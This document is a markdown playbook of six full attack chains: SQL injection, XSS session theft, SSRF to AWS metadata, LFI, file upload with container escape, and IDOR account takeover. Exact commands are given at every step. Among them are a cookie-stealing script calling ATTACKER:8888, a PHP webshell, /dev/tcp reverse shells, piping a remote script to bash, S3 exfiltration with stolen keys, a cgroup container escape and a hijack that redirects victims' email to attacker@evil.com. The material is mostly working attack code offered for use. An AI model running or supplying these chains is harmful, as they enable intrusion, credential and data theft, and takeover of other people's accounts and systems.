# Exploit Chains — Full Attack Paths

> Real multi-step attack chains with exact commands at every step.
> Each chain includes decision points and failure fallbacks.

---

## Chain 1: SQLi → Credential Dump → Password Reuse → SSH Lateral → Privesc → Domain

### Step 1: Confirm SQLi and Extract Credentials
```bash
# Confirm injection point
curl -s "http://target/products?id=1' AND 1=1-- -"   # normal response
curl -s "http://target/products?id=1' AND 1=2-- -"   # different response → injectable

# Enumerate databases
sqlmap -u 'http://target/products?id=1' --batch --dbs
# Output: webapp_db, mysql, information_schema

# Dump user table
sqlmap -u 'http://target/products?id=1' --batch -D webapp_db -T users --dump
# Output: admin:$2b$12$LJ3m4ys...(bcrypt), dbadmin:5f4dcc3b... (MD5)
```
**Decision point:** If hashes are bcrypt → hashcat mode 3200 (slow). If MD5/SHA1 → fast crack.
**Fallback:** If sqlmap blocked → use manual UNION injection or time-based (see failure_recovery.md).

### Step 2: Crack Credentials
```bash
# Save hashes to file
echo '5f4dcc3b5aa765d61d8327deb882cf99' > hashes.txt

# Crack MD5 with hashcat
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
# Or john
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
# Output: dbadmin:password123
```
**Decision point:** If crack fails → try credential from SQLi `--passwords` flag, or `--file-read=/etc/shadow`.

### Step 3: Test Password Reuse via SSH
```bash
# Spray creds against SSH on discovered hosts (from recon)
crackmapexec ssh 10.10.10.0/24 -u dbadmin -p 'password123' --no-bruteforce
# Output: 10.10.10.50 [+] dbadmin:password123

# Connect
ssh dbadmin@10.10.10.50
```
**Fallback:** If SSH blocked → try same creds on RDP, SMB, web apps, VPN, FTP.

### Step 4: Privilege Escalation
```bash
# On 10.10.10.50 as dbadmin
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/find

# GTFOBins privesc with find
sudo find / -exec /bin/bash -p \; -quit
id   # uid=0(root)
```
**Fallback:** If no sudo → run linpeas: `curl http://ATTACKER/linpeas.sh | bash`

### Step 5: Domain Pivot (if AD environment)
```bash
# Dump local hashes
cat /etc/shadow   # Linux
# Or on Windows: hashdump via meterpreter, or secretsdump
impacket-secretsdump dbadmin:password123@10.10.10.50

# Check for domain credentials in memory, config files, keytabs
find / -name '*.keytab' 2>/dev/null
find / -name 'krb5.conf' 2>/dev/null
grep -r 'password' /opt/ /var/www/ /home/ 2>/dev/null | head -20
```

---

## Chain 2: XSS → Session Hijack → Admin Panel → File Upload → Webshell → Reverse Shell

### Step 1: Confirm and Weaponize XSS
```bash
# Confirm reflected XSS
curl -s 'http://target/search?q=<script>alert(1)</script>' | grep '<script>alert'

# Set up cookie catcher on attacker machine
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'COOKIE: {urllib.parse.unquote(self.path)}')
        self.send_response(200); self.end_headers()
    def log_message(self,*a): pass
HTTPServer(('0.0.0.0',8888),H).serve_forever()
" &

# Craft payload URL
PAYLOAD='<script>fetch("http://ATTACKER:8888/steal?c="+document.cookie)</script>'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
echo "Send to admin: http://target/search?q=${ENCODED}"
```

### Step 2: Deliver to Admin and Steal Session
```bash
# Delivery vectors:
# - Submit support ticket containing the link
# - If stored XSS: inject in profile/comment, wait for admin to view
# - Email phishing (if in scope)

# Wait for callback on attacker server
# Output: COOKIE: /steal?c=session=abc123def456; admin=true
```
**Decision point:** If HttpOnly flag set → XSS can't steal cookies. Pivot to: CSRF to create admin account, or keylogging via injected JS.

### Step 3: Hijack Admin Session
```bash
# Use stolen cookie
curl -s -H 'Cookie: session=abc123def456' 'http://target/admin/dashboard'
# Confirm admin access — look for upload functionality, user management
```

### Step 4: Upload Webshell
```bash
# Create PHP webshell
echo '<?php system($_GET["c"]); ?>' > shell.php

# Upload via admin panel
curl -s -H 'Cookie: session=abc123def456' \
  -F 'file=@shell.php' -F 'type=plugin' \
  'http://target/admin/upload'

# If extension blocked, try bypass
mv shell.php shell.php.jpg
curl -s -H 'Cookie: session=abc123def456' \
  -F 'file=@shell.php.jpg;type=image/jpeg' \
  'http://target/admin/upload'

# Or double extension
mv shell.php shell.phtml
```
**Fallback:** If all uploads blocked → check for template editing, scheduled task injection, or database-stored eval.

### Step 5: Confirm RCE and Get Reverse Shell
```bash
# Test webshell
curl -s 'http://target/uploads/shell.php?c=id'
# Output: www-data

# Set up listener
nc -lvnp 4444

# Trigger reverse shell
curl -s 'http://target/uploads/shell.php?c=bash+-c+"bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261"'

# Stabilize shell on listener
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Chain 3: SSRF → Cloud Metadata → AWS Keys → S3 Dump → Credential Pivot

### Step 1: Identify and Confirm SSRF
```bash
# Common SSRF injection points: URL fetch, webhook, PDF generation, image import
curl -s 'http://target/api/preview?url=http://ATTACKER:8888/ssrf-test'
# Check attacker server for callback

# Confirm internal access
curl -s 'http://target/api/preview?url=http://127.0.0.1:80/'
```

### Step 2: Access Cloud Metadata
```bash
# AWS IMDSv1 (no token required)
curl -s 'http://target/api/preview?url=http://169.254.169.254/latest/meta-data/'

# Get IAM role name
curl -s 'http://target/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# Output: webapp-production-role

# Get temporary credentials
curl -s 'http://target/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-production-role'
```
**Decision point:** If IMDSv2 enforced → need PUT request with header. Most SSRFs can't do this. Try redirect-based bypass or look for other internal services.

### Step 3: Use Stolen AWS Credentials
```bash
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=FwoGZXIvYX...

# Verify identity
aws sts get-caller-identity
# Output: Account 123456789012, Role webapp-production-role

# Enumerate permissions
aws s3 ls
aws ec2 describe-instances --region us-east-1 --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,Tags[?Key==`Name`].Value|[0]]' --output table
```

### Step 4: Exfiltrate from S3
```bash
# List sensitive buckets
aws s3 ls s3://company-backups/ --recursive | grep -E '\.(sql|csv|xlsx|env|key|pem)'

# Download targeted files
aws s3 cp s3://company-backups/db-backup-2024.sql.gz /tmp/
aws s3 cp s3://company-configs/.env /tmp/

# Check for more creds in downloaded files
zcat /tmp/db-backup-2024.sql.gz | grep -i 'password\|secret\|api_key' | head -20
cat /tmp/.env | grep -i 'key\|secret\|password'
```

### Step 5: Pivot with Found Credentials
```bash
# Use any DB creds found in .env
mysql -h rds-endpoint.amazonaws.com -u admin -p'FoundPassword' -e 'SHOW DATABASES;'

# Use any AWS keys found in config files (permanent keys > temp role creds)
export AWS_ACCESS_KEY_ID=AKIA_NEW_KEY
export AWS_SECRET_ACCESS_KEY=new_secret
aws sts get-caller-identity   # check what this key can do
```

---

## Chain 4: LFI → Source Code → Hardcoded Creds → Database Access → Full Dump

### Step 1: Confirm LFI
```bash
curl -s 'http://target/page?file=../../../../etc/passwd'
# Output: root:x:0:0:root:/root:/bin/bash ...

# Determine web root from process info
curl -s 'http://target/page?file=../../../../proc/self/cmdline' | tr '\0' ' '
# Or from default locations
curl -s 'http://target/page?file=../../../../var/www/html/index.php'
```

### Step 2: Read Application Source Code
```bash
# PHP applications
curl -s 'http://target/page?file=../../../../var/www/html/config.php'
curl -s 'http://target/page?file=../../../../var/www/html/.env'
curl -s 'http://target/page?file=../../../../var/www/html/wp-config.php'

# If PHP filter available (read source without execution)
curl -s 'http://target/page?file=php://filter/convert.base64-encode/resource=config.php' | base64 -d

# Common config locations
curl -s 'http://target/page?file=../../../../etc/apache2/sites-enabled/000-default.conf'
curl -s 'http://target/page?file=../../../../var/www/.env'
```
**Decision point:** If LFI is limited (null byte, extension appended) → try `%00` (legacy PHP), `....//....//` for filter bypass, or PHP wrappers.

### Step 3: Extract Database Credentials
```bash
# From config.php output:
# $db_host = 'localhost';
# $db_user = 'webapp';
# $db_pass = 'Sup3rS3cret!';
# $db_name = 'production';
```

### Step 4: Access Database Directly
```bash
# If MySQL port is exposed (3306)
mysql -h target -u webapp -p'Sup3rS3cret!' production -e 'SHOW TABLES;'
mysql -h target -u webapp -p'Sup3rS3cret!' production -e 'SELECT * FROM users LIMIT 10;'

# If not directly accessible, use SQLi via LFI + log poisoning for RCE
# Poison Apache log
curl -s -H "User-Agent: <?php system(\$_GET['c']); ?>" 'http://target/'
# Trigger via LFI
curl -s 'http://target/page?file=../../../../var/log/apache2/access.log&c=mysql+-u+webapp+-pSup3rS3cret!+production+-e+"SELECT+*+FROM+users"'
```

### Step 5: Full Database Dump
```bash
mysqldump -h target -u webapp -p'Sup3rS3cret!' production > full_dump.sql
grep -E 'INSERT INTO.*users' full_dump.sql | head -5
```

---

## Chain 5: File Upload → Webshell → Reverse Shell → Container Escape → Host Access

### Step 1–3: Upload and Get Shell (see Chain 2, Steps 4–5)
```bash
# Upload webshell, confirm RCE, get reverse shell
# After stabilizing shell, check if in container
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv
hostname   # random hex string = likely container
```

### Step 4: Container Escape
```bash
# Check for privileged mode
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = privileged container (all caps)

# Privileged container escape via cgroup notify_on_release
mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape
mkdir /tmp/escape/x
echo 1 > /tmp/escape/x/notify_on_release
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo "$host_path/cmd" > /tmp/escape/release_agent
echo '#!/bin/bash' > /cmd
echo 'bash -i >& /dev/tcp/ATTACKER/5555 0>&1' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/escape/x/cgroup.procs"

# Alternative: mounted Docker socket
ls -la /var/run/docker.sock
# If accessible:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash

# Alternative: host PID namespace
ls /proc/1/root/   # if accessible, you can see host filesystem
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```
**Fallback:** If no escape possible → enumerate internal network from container, pivot to other services.

### Step 5: Host Access Post-Escape
```bash
# Now on host — full privesc
id && hostname && ip a
cat /etc/shadow
find / -name '*.kube' -o -name 'kubeconfig' 2>/dev/null
cat /root/.ssh/id_rsa
```

---

## Chain 6: IDOR → PII Dump → Credential Reuse → Account Takeover

### Step 1: Discover and Confirm IDOR
```bash
# Test sequential IDs
curl -s -H 'Cookie: session=YOUR_TOKEN' 'http://target/api/user/1001'  # your profile
curl -s -H 'Cookie: session=YOUR_TOKEN' 'http://target/api/user/1002'  # another user?

# If returns 200 with different user's data → confirmed IDOR
```

### Step 2: Enumerate All Users
```bash
# Generate ID list and mass-request
ffuf -u 'http://target/api/user/FUZZ' -w <(seq 1000 2000) \
  -H 'Cookie: session=YOUR_TOKEN' -mc 200 -o idor_results.json -of json

# Parse results for emails and PII
cat idor_results.json | jq -r '.results[].response' | grep -oP '"email":"[^"]*"' | sort -u > emails.txt
cat idor_results.json | jq -r '.results[].response' | grep -oP '"phone":"[^"]*"' | sort -u > phones.txt
```
**Decision point:** If sequential IDs return 403 → try UUIDs leaked in JS files, API responses, or error messages.

### Step 3: Check for Credential Reuse
```bash
# Cross-reference emails with known breaches (authorized testing only)
# Use breach databases or OSINT tools available in scope

# Check if leaked passwords work on target
hydra -L emails.txt -P found_passwords.txt http-post-form \
  "target/login:email=^USER^&password=^PASS^:Invalid credentials" -t 4 -f

# Or manual testing with curl
curl -s -X POST 'http://target/login' \
  -d 'email=victim@target.com&password=breached_password123' \
  -c cookies.txt -v 2>&1 | grep -E 'Set-Cookie|302|dashboard'
```

### Step 4: Account Takeover
```bash
# With valid session from credential reuse
curl -s -b cookies.txt 'http://target/api/user/profile'
# Change email → password reset to attacker email
curl -s -b cookies.txt -X PUT 'http://target/api/user/profile' \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com"}'

# Or change password directly if allowed
curl -s -b cookies.txt -X POST 'http://target/api/user/change-password' \
  -H 'Content-Type: application/json' \
  -d '{"new_password":"Pwned!2024"}'
```
**Fallback:** If login rate-limited → try password reset flow with IDOR, or check for API key/token in user profile data.

---

## Chain Decision Matrix

| Recon Finding | Primary Chain | Fallback Chain |
|---------------|--------------|----------------|
| SQLi confirmed | Chain 1 (SQLi → creds → lateral) | Chain 4 (if LFI also found) |
| XSS confirmed | Chain 2 (XSS → session → admin) | Chain 6 (if IDOR also found) |
| SSRF confirmed | Chain 3 (SSRF → cloud → pivot) | Chain 5 (if file upload found) |
| LFI confirmed | Chain 4 (LFI → source → DB) | Chain 1 (if creds lead to SQLi) |
| File upload | Chain 5 (upload → shell → escape) | Chain 2 (if admin needed first) |
| IDOR confirmed | Chain 6 (IDOR → PII → takeover) | Chain 1 (if creds found) |
